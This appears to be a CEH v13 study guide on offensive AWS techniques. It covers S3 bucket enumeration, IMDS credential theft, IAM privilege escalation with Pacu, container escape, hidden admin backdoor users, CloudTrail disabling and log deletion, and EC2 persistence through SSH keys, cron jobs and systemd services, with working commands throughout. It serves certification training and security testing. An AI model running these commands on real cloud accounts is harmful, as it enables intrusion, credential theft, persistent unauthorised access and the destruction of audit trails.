# AWS Hacking Demonstrations - CEH v13

## S3 Bucket Enumeration and Exploitation

### Enumerating S3 Buckets

#### Manual Enumeration Techniques
- **Bucket Naming Conventions**: Common patterns for bucket names
  - Company name + common suffixes (backups, logs, data)
  - Project names + environment (dev, staging, prod)
  - Date-based naming (2024-backups, jan-logs)
- **URL Patterns**: Direct access attempts using common formats
  - `http://bucketname.s3.amazonaws.com`
  - `https://s3.amazonaws.com/bucketname`
  - `https://s3-region.amazonaws.com/bucketname`

#### DNS-Based Discovery
- **DNS Zone Walking**: Enumerate S3 subdomains
- **Certificate Transparency**: Search CT logs for S3 references
- **Google Dorking**: Search for exposed S3 URLs
  - `site:s3.amazonaws.com`
  - `inurl:s3.amazonaws.com`
  - `filetype:xml site:s3.amazonaws.com`

### Enumerating S3 Buckets Using S3Scanner

#### S3Scanner Overview
- **Purpose**: Find and analyze S3 buckets for security misconfigurations
- **Features**: Permission testing, content discovery, bulk scanning
- **Detection**: Readable, writable, and listable bucket identification

#### S3Scanner Usage
```bash
# Install S3Scanner
pip install s3scanner

# Basic bucket check
s3scanner bucket_name

# Bulk scanning from file
s3scanner -f bucket_list.txt

# Check specific permissions
s3scanner bucket_name --read --write --list

# Save results to file
s3scanner bucket_name -o results.txt
```

#### Permission Testing
- **Read Access**: Check if bucket contents are publicly readable
- **Write Access**: Test if files can be uploaded to bucket
- **List Access**: Verify if bucket contents can be listed
- **Delete Access**: Test if objects can be deleted from bucket

### Enumerating S3 Bucket Permissions Using BucketLoot

#### BucketLoot Features
- **Permission Analysis**: Comprehensive S3 permission testing
- **Content Discovery**: Identify sensitive files and data
- **Automation**: Bulk bucket analysis capabilities
- **Reporting**: Detailed permission and content reports

#### BucketLoot Usage
```bash
# Clone and install BucketLoot
git clone https://github.com/Greenwolf/BucketLoot.git
pip install -r requirements.txt

# Single bucket analysis
python bucketloot.py -b bucket_name

# Multiple bucket analysis
python bucketloot.py -f bucket_list.txt

# Permission-specific testing
python bucketloot.py -b bucket_name --read-only
```

#### Analysis Categories
- **Public Access**: Buckets accessible without authentication
- **Authenticated Access**: Buckets requiring AWS credentials
- **Sensitive Content**: Files containing potential sensitive data
- **Misconfiguration**: Buckets with overly permissive policies

### Enumerating S3 Buckets Using CloudBrute

#### CloudBrute Capabilities
- **Multi-Cloud**: Support for AWS, Azure, and GCP storage
- **Dictionary Attacks**: Use wordlists for bucket name guessing
- **Keyword Generation**: Generate bucket names based on target information
- **Rate Limiting**: Avoid detection with request throttling

#### CloudBrute Usage
```bash
# Install CloudBrute
go get -u github.com/0xsha/CloudBrute

# Basic enumeration
CloudBrute -d target_domain -k target_keywords -w wordlist.txt

# AWS-specific enumeration
CloudBrute -p aws -d company.com -k company,backup,data

# Output to file
CloudBrute -d target.com -o results.txt
```

#### Keyword Strategy
- **Company Information**: Company name, products, services
- **Technical Terms**: Application names, project codes, environments
- **Common Suffixes**: backup, logs, data, assets, images, files
- **Date Patterns**: Current year, months, quarters

## AWS Resource Enumeration

### Enumerating EC2 Instances

#### Instance Discovery Methods
- **Public IP Scanning**: Scan known AWS IP ranges for EC2 instances
- **DNS Enumeration**: Find EC2 instances through DNS records
- **Certificate Analysis**: SSL certificates revealing EC2 hostnames
- **Metadata Service**: Access instance metadata when available

#### EC2-Specific Reconnaissance
- **Instance Metadata Service (IMDS)**: 
  - URL: `http://169.254.169.254/latest/meta-data/`
  - Information: Instance ID, security groups, IAM roles, user data
- **Security Group Analysis**: Identify open ports and services
- **AMI Information**: Determine base images and potential vulnerabilities
- **Instance Types**: Understand compute resources and capabilities

#### Tools for EC2 Enumeration
- **AWS CLI**: Command-line interface for AWS services
- **Boto3**: Python SDK for AWS automation
- **Nmap**: Network scanning for EC2 instances
- **Shodan**: Search engine for internet-connected devices

### Enumerating AWS RDS Instances

#### RDS Discovery Techniques
- **Port Scanning**: Common database ports (3306, 5432, 1433)
- **DNS Analysis**: RDS endpoint discovery through DNS
- **Configuration Files**: Application configs revealing RDS endpoints
- **Error Messages**: Database errors exposing connection strings

#### RDS Security Assessment
- **Public Access**: Check if RDS instances are publicly accessible
- **Security Groups**: Analyze inbound and outbound rules
- **Encryption Status**: Verify encryption at rest and in transit
- **Backup Configuration**: Assess backup and snapshot settings
- **Parameter Groups**: Review database configuration parameters

#### RDS Enumeration Tools
```bash
# AWS CLI RDS enumeration
aws rds describe-db-instances
aws rds describe-db-snapshots --include-public

# Check for public RDS instances
aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==`true`]'
```

### Enumerating AWS Account IDs and IAM Roles

#### Account ID Discovery
- **S3 Bucket Policies**: Account IDs in bucket policies
- **CloudTrail Logs**: Account information in audit logs
- **SNS Topic ARNs**: Extract account IDs from ARN strings
- **IAM Error Messages**: Account IDs leaked in error responses

#### IAM Role Enumeration
- **AssumeRole Operations**: Test role assumption capabilities
- **Cross-Account Access**: Identify roles accessible from external accounts
- **Service-Linked Roles**: Enumerate AWS service roles
- **Trust Relationships**: Analyze role trust policies

#### Enumeration Techniques
```bash
# List IAM roles (requires credentials)
aws iam list-roles

# Get role details
aws iam get-role --role-name RoleName

# List attached policies
aws iam list-attached-role-policies --role-name RoleName

# Test role assumption
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/RoleName
```

### Enumerating Weak IAM Policies Using CloudSplaining

#### CloudSplaining Overview
- **Purpose**: Identify overprivileged IAM policies and roles
- **Analysis**: Risk assessment of IAM permissions
- **Reporting**: HTML reports with policy analysis and recommendations
- **Compliance**: Maps findings to security best practices

#### CloudSplaining Usage
```bash
# Install CloudSplaining
pip install cloudsplaining

# Download IAM account authorization details
aws iam get-account-authorization-details > auth-details.json

# Analyze IAM policies
cloudsplaining download
cloudsplaining scan --input-file auth-details.json

# Generate HTML report
cloudsplaining scan --input-file auth-details.json --output report.html
```

#### Risk Categories
- **Privilege Escalation**: Policies allowing privilege escalation
- **Resource Exposure**: Policies exposing sensitive resources
- **Service Wildcard**: Policies with overly broad permissions
- **Resource Wildcard**: Policies with unrestricted resource access

### Enumerating AWS Cognito

#### Cognito User Pool Discovery
- **Application Analysis**: Extract Cognito configuration from web apps
- **Mobile App Analysis**: Reverse engineer mobile applications
- **DNS Enumeration**: Find Cognito endpoints through DNS
- **Configuration Files**: Discover Cognito settings in code repositories

#### Cognito Security Testing
- **User Enumeration**: Test for user enumeration vulnerabilities
- **Password Policy**: Analyze password complexity requirements
- **MFA Bypass**: Test multi-factor authentication bypass
- **JWT Token Analysis**: Analyze JWT tokens for vulnerabilities

#### Cognito Enumeration Tools
```bash
# AWS CLI Cognito enumeration
aws cognito-idp list-user-pools --max-results 20
aws cognito-identity list-identity-pools --max-results 20

# User pool details
aws cognito-idp describe-user-pool --user-pool-id us-east-1_XXXXXXXXX

# List users (requires appropriate permissions)
aws cognito-idp list-users --user-pool-id us-east-1_XXXXXXXXX
```

### Enumerating DNS Records of AWS Accounts Using Ghostbuster

#### Ghostbuster Overview
- **Purpose**: Identify dangling DNS records pointing to AWS resources
- **Detection**: Subdomain takeover opportunities
- **Multi-Service**: Supports S3, CloudFront, ELB, and other AWS services
- **Automation**: Bulk DNS record analysis

#### Ghostbuster Usage
```bash
# Install Ghostbuster
go get -u github.com/assetnote/ghostbuster

# Basic DNS enumeration
ghostbuster -d target.com

# Specific service targeting
ghostbuster -d target.com -s s3,cloudfront,elb

# Output results to file
ghostbuster -d target.com -o results.json
```

#### Dangling DNS Indicators
- **S3 Buckets**: DNS pointing to non-existent buckets
- **CloudFront**: Invalid distribution endpoints
- **ELB**: Deleted load balancer endpoints
- **API Gateway**: Removed API endpoints

### Enumerating Serverless Resources in AWS

#### Lambda Function Discovery
- **Function Enumeration**: List accessible Lambda functions
- **API Gateway Integration**: Find API endpoints triggering functions
- **Event Source Mapping**: Identify function triggers and event sources
- **Environment Variables**: Extract configuration and secrets

#### Serverless Enumeration Techniques
```bash
# List Lambda functions
aws lambda list-functions

# Get function configuration
aws lambda get-function --function-name function-name

# List API Gateway APIs
aws apigateway get-rest-apis

# Get API details
aws apigateway get-resources --rest-api-id api-id
```

#### Step Functions and SQS
- **State Machines**: Enumerate Step Function workflows
- **Queue Discovery**: Find SQS queues and their permissions
- **SNS Topics**: Identify notification topics and subscriptions
- **Event Rules**: CloudWatch Events and EventBridge rules

## Attack Path Discovery

### Discovering Attack Paths Using Cartography

#### Cartography Overview
- **Purpose**: Graph-based AWS infrastructure mapping
- **Visualization**: Neo4j graph database for relationship mapping
- **Analysis**: Identify attack paths and security gaps
- **Multi-Account**: Support for multiple AWS accounts

#### Cartography Setup and Usage
```bash
# Install Cartography
pip install cartography

# Configure AWS credentials and run
cartography --neo4j-uri bolt://localhost:7687

# Query examples in Neo4j
MATCH (u:AWSUser)-[:MEMBER_OF_AWS_GROUP]->(g:AWSGroup)
RETURN u.name, g.name

MATCH (r:AWSRole)-[:TRUSTS_AWS_PRINCIPAL]->(p)
WHERE p.type = 'Service'
RETURN r.name, p.name
```

#### Attack Path Analysis
- **Privilege Escalation**: Identify paths to elevated permissions
- **Cross-Service Access**: Map access between different AWS services
- **Resource Relationships**: Understand resource dependencies
- **Trust Relationships**: Analyze IAM trust policies

### Discovering Attack Paths Using CloudFox

#### CloudFox Capabilities
- **Multi-Cloud**: AWS, Azure, and GCP attack path discovery
- **Enumeration**: Comprehensive cloud resource enumeration
- **Path Analysis**: Identify privilege escalation opportunities
- **Reporting**: Detailed attack path documentation

#### CloudFox Usage
```bash
# Install CloudFox
go install github.com/BishopFox/cloudfox@latest

# AWS enumeration
cloudfox aws --profile aws-profile all-checks

# Specific checks
cloudfox aws --profile aws-profile permissions
cloudfox aws --profile aws-profile principals

# Generate reports
cloudfox aws --profile aws-profile --output-dir results/
```

#### Key Discovery Areas
- **IAM Permissions**: Overprivileged roles and policies
- **Resource Access**: Cross-resource access opportunities
- **Service Integration**: Inter-service attack vectors
- **Network Paths**: Network-based attack opportunities

### Identifying Security Groups Exposed to the Internet

#### Security Group Analysis
- **Inbound Rules**: Rules allowing internet access (0.0.0.0/0)
- **Port Exposure**: Common ports exposed to the internet
- **Protocol Analysis**: TCP/UDP/ICMP exposure assessment
- **Resource Association**: Resources using exposed security groups

#### Analysis Tools and Techniques
```bash
# List security groups with open rules
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]'

# Find RDP/SSH exposure
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?FromPort==`22` || FromPort==`3389`]]'

# Security group usage
aws ec2 describe-instances --query 'Reservations[].Instances[].SecurityGroups'
```

#### Risk Assessment
- **Critical Ports**: SSH (22), RDP (3389), database ports
- **Management Interfaces**: Web admin panels, API endpoints
- **Unnecessary Exposure**: Services that don't require internet access
- **Default Configurations**: AWS default security group settings

## AWS Threat Emulation

### AWS Threat Emulation Using Stratus Red Team

#### Stratus Red Team Overview
- **Purpose**: Simulate adversary techniques in AWS environments
- **MITRE ATT&CK**: Techniques mapped to ATT&CK framework
- **Safe Testing**: Controlled attack simulation
- **Detection Testing**: Validate security monitoring and controls

#### Stratus Red Team Usage
```bash
# Install Stratus Red Team
go install github.com/DataDog/stratus-red-team@latest

# List available techniques
stratus list

# Execute specific technique
stratus detonate aws.credential-access.ec2-get-password-data

# Warm up technique (prepare resources)
stratus warmup aws.persistence.iam-backdoor-user

# Clean up after testing
stratus cleanup aws.persistence.iam-backdoor-user
```

#### Technique Categories
- **Initial Access**: Techniques for gaining initial foothold
- **Persistence**: Methods for maintaining access
- **Privilege Escalation**: Permission elevation techniques
- **Defense Evasion**: Techniques to avoid detection
- **Credential Access**: Methods for obtaining credentials
- **Discovery**: Enumeration and reconnaissance techniques
- **Lateral Movement**: Techniques for moving through environment
- **Collection**: Data gathering methods
- **Exfiltration**: Data extraction techniques

### Instance Metadata Service (IMDS) Attacks

#### Gathering Cloud Keys Through IMDS Attack

#### IMDS Overview
- **Purpose**: Provide instance metadata to EC2 instances
- **Access**: Available from within EC2 instances only
- **Endpoint**: http://169.254.169.254/latest/meta-data/
- **Security Risk**: Can expose sensitive information including IAM credentials

#### IMDS Attack Vectors
- **SSRF Exploitation**: Server-Side Request Forgery to access IMDS
- **Direct Access**: When instance is compromised
- **Application Vulnerabilities**: Web apps making requests to IMDS
- **Proxy Attacks**: Using compromised instances as proxies

#### IMDS Enumeration
```bash
# Basic metadata access
curl http://169.254.169.254/latest/meta-data/

# Instance identity document
curl http://169.254.169.254/latest/dynamic/instance-identity/document

# IAM role information
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Security credentials for role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

#### Credential Extraction
- **Access Keys**: AWS access key ID and secret access key
- **Session Tokens**: Temporary credentials for assumed roles
- **Role Information**: IAM role names and policies
- **Instance Details**: Instance ID, region, availability zone

#### IMDS Protection Mechanisms
- **IMDSv2**: Requires token-based authentication
- **Instance Firewalls**: Block IMDS access where not needed
- **Application Controls**: Prevent applications from accessing IMDS
- **Network Segmentation**: Isolate instances from IMDS access

## S3 Bucket Exploitation

### Exploiting Misconfigured AWS S3 Buckets

#### Common S3 Misconfigurations
- **Public Read Access**: Buckets readable by anyone
- **Public Write Access**: Buckets writable by anyone
- **Authenticated User Access**: Buckets accessible to all AWS users
- **Overpermissive Bucket Policies**: Policies granting excessive access

#### Exploitation Techniques
```bash
# List bucket contents
aws s3 ls s3://bucket-name --no-sign-request

# Download bucket contents
aws s3 sync s3://bucket-name ./local-folder --no-sign-request

# Upload malicious files
aws s3 cp malicious-file.txt s3://bucket-name/

# Modify bucket policy
aws s3api put-bucket-policy --bucket bucket-name --policy file://policy.json
```

#### Data Discovery in S3
- **Sensitive Files**: Configuration files, backups, logs
- **Credentials**: API keys, database passwords, certificates
- **Personal Data**: Customer information, financial records
- **Source Code**: Application code, deployment scripts

#### S3 Attack Impact
- **Data Breach**: Exposure of sensitive information
- **Data Manipulation**: Modification or deletion of data
- **Malware Distribution**: Using S3 to host malicious content
- **Cryptocurrency Mining**: Abuse of S3 resources

## IAM Compromise and Exploitation

### Compromising AWS IAM Credentials

#### Credential Discovery Methods
- **Code Repositories**: GitHub, GitLab credential exposure
- **Configuration Files**: Application and infrastructure configs
- **Environment Variables**: Exposed environment configurations
- **Memory Dumps**: Extract credentials from memory
- **Network Traffic**: Intercept credentials in transit

#### Credential Types
- **Access Keys**: Long-term programmatic access credentials
- **Temporary Credentials**: Short-term session tokens
- **Instance Profile**: IAM roles for EC2 instances
- **Service Account Keys**: Service-specific authentication

#### Credential Validation
```bash
# Test credential validity
aws sts get-caller-identity

# List accessible resources
aws iam list-attached-user-policies --user-name username
aws iam get-user --user-name username

# Enumerate permissions
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::account:user/username --action-names '*' --resource-arns '*'
```

### Hijacking Misconfigured IAM Roles Using Pacu

#### Pacu Framework Overview
- **Purpose**: AWS exploitation framework
- **Modules**: 35+ modules for different attack techniques
- **Session Management**: Track and manage attack sessions
- **Automation**: Automated exploitation workflows

#### Pacu Installation and Setup
```bash
# Install Pacu
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu && bash install.sh

# Start Pacu
python3 pacu.py

# Create new session
new_session session_name

# Set AWS credentials
set_keys --access-key-id AKIAIOSFODNN7EXAMPLE --secret-access-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

#### Key Pacu Modules
- **enum_users_roles_policies_groups**: Enumerate IAM resources
- **privesc_scan**: Identify privilege escalation opportunities
- **backdoor_users_keys**: Create backdoor access
- **enum_secrets**: Find secrets in various AWS services
- **lateral_movement**: Move between AWS accounts

#### IAM Role Hijacking Techniques
```bash
# Enumerate IAM roles
run enum_users_roles_policies_groups

# Check for privilege escalation
run privesc_scan

# Attempt role assumption
run assume_role --role-arn arn:aws:iam::123456789012:role/TargetRole

# Create persistence
run backdoor_users_keys
```

### Scanning AWS Access Keys Using DumpsterDiver

#### DumpsterDiver Overview
- **Purpose**: Search for secrets in various data sources
- **Sources**: Git repositories, file systems, databases
- **Detection**: AWS keys, API keys, passwords, certificates
- **Automation**: Bulk scanning and analysis

#### DumpsterDiver Usage
```bash
# Install DumpsterDiver
pip install dumpsterdiver

# Search local directory
dumpsterdiver -p /path/to/search --aws

# Search Git repository
dumpsterdiver -g https://github.com/user/repo --aws

# Advanced search options
dumpsterdiver -p /path --aws --entropy --min-key 20
```

#### AWS Key Detection Patterns
- **Access Key ID**: AKIA[0-9A-Z]{16}
- **Secret Access Key**: [0-9a-zA-Z/+=]{40}
- **Session Token**: Long base64-encoded strings
- **ARN Patterns**: arn:aws:iam::account:role/name

## Container Exploitation

### Exploiting Docker Containers on AWS Using CCAT

#### Container Cloud Attack Tool (CCAT)
- **Purpose**: Exploit misconfigurations in containerized cloud environments
- **Targets**: Docker, Kubernetes, cloud container services
- **Techniques**: Container escape, privilege escalation, lateral movement
- **AWS Focus**: ECS, EKS, and EC2 container exploitation

#### CCAT Usage Scenarios
- **Exposed Docker Daemon**: Exploiting accessible Docker APIs
- **Privileged Containers**: Containers running with excessive privileges
- **Host Mount Abuse**: Containers with dangerous host mounts
- **Network Exploitation**: Container-to-container and container-to-host attacks

#### Container Escape Techniques
```bash
# Check for privileged container
capsh --print

# Host filesystem access
ls /host/etc/passwd

# Docker socket abuse
docker -H unix:///host/var/run/docker.sock run -it --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
```

#### AWS Container Service Exploitation
- **ECS Task Exploitation**: Exploit misconfigurations in ECS tasks
- **EKS Cluster Access**: Gain access to Kubernetes clusters
- **ECR Repository Access**: Access container registries
- **Container Instance Compromise**: Compromise underlying EC2 instances

## Advanced AWS Attacks

### Exploiting Shadow Admins in AWS

#### Shadow Admin Concept
- **Definition**: Users with indirect administrative access through policy combinations
- **Risk**: Hidden privilege escalation paths
- **Detection**: Requires comprehensive IAM analysis
- **Impact**: Undetected administrative access

#### Shadow Admin Identification
- **Policy Analysis**: Analyze combined effect of multiple policies
- **Transitive Permissions**: Permissions gained through service roles
- **Cross-Service Access**: Administrative access through service integrations
- **Implicit Permissions**: Permissions not explicitly granted but available

#### Common Shadow Admin Scenarios
```bash
# User with permission to modify IAM policies
aws iam put-user-policy --user-name target-user --policy-name admin-policy --policy-document file://admin-policy.json

# User with permission to assume administrative roles
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/admin-role --role-session-name shadow-admin

# User with permission to modify security groups
aws ec2 authorize-security-group-ingress --group-id sg-12345678 --protocol tcp --port 22 --cidr 0.0.0.0/0
```

### Attacks on AWS Lambda

#### Lambda Attack Vectors
- **Code Injection**: Injecting malicious code into Lambda functions
- **Privilege Escalation**: Exploiting Lambda execution roles
- **Data Exfiltration**: Accessing sensitive data through Lambda
- **Denial of Wallet**: Causing excessive Lambda invocations

#### Lambda Enumeration and Exploitation
```bash
# List Lambda functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name function-name

# Invoke function with malicious payload
aws lambda invoke --function-name function-name --payload '{"malicious": "payload"}' output.txt

# Update function code
aws lambda update-function-code --function-name function-name --zip-file fileb://malicious.zip
```

#### Lambda Security Issues
- **Environment Variables**: Secrets stored in environment variables
- **Overprivileged Roles**: Lambda functions with excessive permissions
- **VPC Configuration**: Network access and security group misconfigurations
- **Dead Letter Queues**: Sensitive data in error queues

### AWS IAM Privilege Escalation Techniques

#### Privilege Escalation Methods
- **Policy Attachment**: Attach policies to users/roles
- **Role Creation**: Create new roles with elevated permissions
- **Policy Versioning**: Modify existing policy versions
- **Cross-Account Access**: Gain access to other AWS accounts

#### Common Escalation Techniques
```bash
# Create administrative user
aws iam create-user --user-name admin-user
aws iam attach-user-policy --user-name admin-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access keys for user
aws iam create-access-key --user-name admin-user

# Assume administrative role
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/admin-role --role-session-name escalation

# Modify existing policy
aws iam put-user-policy --user-name existing-user --policy-name escalation --policy-document file://admin-policy.json
```

#### Escalation Prevention
- **Least Privilege**: Grant minimum required permissions
- **Permission Boundaries**: Use permission boundaries to limit escalation
- **Monitoring**: Monitor IAM changes and privilege usage
- **Regular Audits**: Periodic review of IAM permissions

## Persistence and Backdoors

### Creating Backdoor Accounts in AWS

#### Backdoor Account Types
- **Hidden Users**: Users with non-obvious names
- **Service Accounts**: Accounts disguised as legitimate services
- **Cross-Account Roles**: Roles assumable from external accounts
- **Temporary Backdoors**: Short-term access mechanisms

#### Backdoor Creation Techniques
```bash
# Create hidden user
aws iam create-user --user-name system-backup-user
aws iam attach-user-policy --user-name system-backup-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name system-backup-user

# Create cross-account role
aws iam create-role --role-name backup-access-role --assume-role-policy-document file://trust-policy.json
aws iam attach-role-policy --role-name backup-access-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Add trusted entity to existing role
aws iam update-assume-role-policy --role-name existing-role --policy-document file://modified-trust-policy.json
```

### Maintaining Access and Covering Tracks on AWS Cloud Environment

#### Persistence Mechanisms
- **Long-term Credentials**: Create long-lasting access keys
- **Role Chaining**: Use multiple roles for persistent access
- **Lambda Backdoors**: Deploy Lambda functions for persistence
- **CloudFormation Templates**: Use IaC for persistent infrastructure

#### Covering Tracks Techniques
- **CloudTrail Manipulation**: Disable or modify audit logging
- **Log Deletion**: Remove evidence from CloudWatch Logs
- **Event Filtering**: Modify CloudTrail event selectors
- **Cross-Region Tactics**: Spread activities across regions

#### Anti-Forensics Methods
```bash
# Disable CloudTrail
aws cloudtrail stop-logging --name trail-name

# Delete CloudTrail logs
aws logs delete-log-group --log-group-name CloudTrail/LogGroup

# Modify CloudTrail configuration
aws cloudtrail put-event-selectors --trail-name trail-name --event-selectors file://modified-selectors.json

# Clear command history
history -c && history -w
```

### Establishing Persistence on EC2 Instances

#### Instance-Level Persistence
- **SSH Key Installation**: Install additional SSH keys
- **User Account Creation**: Create hidden user accounts
- **Cron Job Installation**: Schedule persistent tasks
- **Service Installation**: Install malicious services

#### Persistence Techniques
```bash
# Add SSH key to authorized_keys
echo "ssh-rsa AAAAB3Nza... attacker@host" >> ~/.ssh/authorized_keys

# Create hidden user account
useradd -m -s /bin/bash -G sudo hidden_user
echo "hidden_user:password" | chpasswd

# Install cron job
echo "0 * * * * /tmp/backdoor.sh" | crontab -

# Create systemd service
cat > /etc/systemd/system/backup.service << EOF
[Unit]
Description=Backup Service

[Service]
ExecStart=/tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF
```

#### Network Persistence
- **Reverse Shells**: Establish outbound connections
- **DNS Tunneling**: Use DNS for covert communication
- **HTTP/HTTPS Beaconing**: Regular check-ins to command servers
- **Cloud Storage**: Use S3/other services for communication

## AWS Training Infrastructure

### AWSGoat - Damn Vulnerable AWS Infrastructure

#### AWSGoat Overview
- **Purpose**: Intentionally vulnerable AWS infrastructure for learning
- **Components**: Multiple vulnerable AWS services and configurations
- **Learning**: Hands-on practice with AWS security testing
- **Scenarios**: Real-world attack scenarios and misconfigurations

#### AWSGoat Components
- **Vulnerable S3 Buckets**: Misconfigured storage buckets
- **Weak IAM Policies**: Overprivileged users and roles
- **Exposed RDS Instances**: Publicly accessible databases
- **Insecure Lambda Functions**: Functions with security flaws
- **Misconfigured Security Groups**: Overly permissive network access

#### AWSGoat Setup
```bash
# Clone AWSGoat repository
git clone https://github.com/ine-labs/AWSGoat.git
cd AWSGoat

# Deploy infrastructure
terraform init
terraform plan
terraform apply

# Access training materials
cat README.md
ls scenarios/
```

#### Training Scenarios
- **S3 Bucket Exploitation**: Practice S3 security testing
- **IAM Privilege Escalation**: Learn privilege escalation techniques
- **RDS Security Testing**: Database security assessment
- **Lambda Security**: Serverless security testing
- **Network Penetration**: Cloud network security testing

---

## Key CEH v13 Exam Points

### Critical Concepts
1. **S3 Security**: Understand bucket enumeration tools and exploitation techniques
2. **IAM Exploitation**: Master privilege escalation and role assumption attacks
3. **Instance Metadata**: Know IMDS attacks and credential extraction methods
4. **Container Security**: Understand AWS container service vulnerabilities
5. **Persistence Mechanisms**: Various methods for maintaining access in AWS
6. **Attack Tools**: Proficiency with Pacu, S3Scanner, CloudFox, and other tools
7. **Threat Emulation**: Using Stratus Red Team for attack simulation

### Exam Focus Areas
* **S3 Enumeration**: Tools like S3Scanner, BucketLoot, CloudBrute for bucket discovery
* **IAM Attacks**: Credential compromise, privilege escalation, shadow admin exploitation
* **IMDS Exploitation**: Understanding and exploiting Instance Metadata Service vulnerabilities
* **AWS Tools**: Pacu framework, DumpsterDiver, CCAT for various attack scenarios
* **Attack Path Discovery**: Using Cartography and CloudFox for infrastructure analysis
* **Lambda Security**: Serverless function exploitation and security issues
* **Persistence Techniques**: Creating backdoors and maintaining access in AWS environments

### Practical Skills
* Execute comprehensive AWS reconnaissance using multiple enumeration tools
* Identify and exploit S3 bucket misconfigurations and weak permissions
* Perform IAM privilege escalation attacks using various techniques
* Extract credentials and sensitive information from IMDS endpoints
* Analyze AWS infrastructure for attack paths and security weaknesses
* Implement persistence mechanisms across different AWS services
* Use specialized tools like Pacu for automated AWS exploitation
* Understand the security implications of different AWS service configurations
